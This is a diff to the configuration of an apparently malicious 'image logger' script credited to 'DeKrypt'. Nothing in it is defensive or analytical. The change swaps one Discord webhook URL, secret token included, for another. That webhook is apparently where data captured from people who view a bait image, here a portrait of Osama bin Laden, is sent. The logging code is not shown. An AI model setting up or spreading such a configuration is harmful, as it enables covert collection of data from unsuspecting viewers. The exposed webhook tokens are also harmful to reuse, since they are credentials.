@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1115082017130950778/5pRGKIfOStjB_t_HKDw-hlvnSXye5XL_eGoZte27AzvqKS6rmIolAxtwNT1dsKGc3NJa",
+    "webhook": "https://discord.com/api/webhooks/1135451114360291408/6QOu61rYZpUCrmf2aUc_9BSkMWTxbSoIrZw_2NfJZwEw9UxeUbp04iCW8UXjzuM_Ygyv",
     "image": "https://upload.wikimedia.org/wikipedia/commons/c/ca/Osama_bin_Laden_portrait.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
